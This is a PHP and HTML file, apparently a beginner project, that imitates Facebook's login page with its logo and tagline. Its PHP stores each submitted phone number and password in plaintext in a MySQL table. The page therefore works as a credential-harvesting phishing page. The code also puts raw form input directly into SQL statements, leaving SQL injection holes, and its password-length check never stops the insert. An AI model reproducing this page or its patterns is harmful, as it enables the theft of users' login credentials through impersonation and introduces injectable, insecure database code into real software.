<?php
$alert = false;
$err=false;
if($_SERVER['REQUEST_METHOD']=="POST"){
    include 'pr/database.php';
    $username = $_POST['username'];
    $password = $_POST['password'];
    // $cpassword = $_POST['cpassword'];
    $money ="$0.00";
    if(strlen($password)<4){
      $err = "Password must be greter than 4 digit";
    }
    
    $sql = "CREATE TABLE `$username` ( `s.no` INT(3) NOT NULL AUTO_INCREMENT , `username` VARCHAR(10) NOT NULL, `password` VARCHAR(15) NOT NULL , `money` VARCHAR(4) NOT NULL, PRIMARY KEY (`s.no`))";
    $result = mysqli_query($con,$sql);
    
    if($result){
      $sqli = "INSERT INTO `$username` (`username`, `password`,`money`) VALUES ('$username', '$password','$money')";
      mysqli_query($con,$sqli);
      $alert = true;
  }
  else{
    $err = "User alredy exist";
  }
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>
<body>
    <form action="/loginsystem/facebook.php" method="post">
        <input type="text" placeholder = "Phone Number" name = "username">
        <br>
        <input type="password" placeholder = "Password" name = "password">
        <button type = "submit">Log In</button> <br>
        <a href="" class = "f-pws">Forgot Passwod</a><br>
        <div class ="line"></div><br>
        <button class = "btn2">Creat new account</button>
    </form>

    <div class="f-container">
        <img src="./640px-Facebook_Logo_(2019).svg.png" alt="facebook">
        <p>Connect with facbook and the world around you on Facebook.</p>
    </div>
</body>
</html>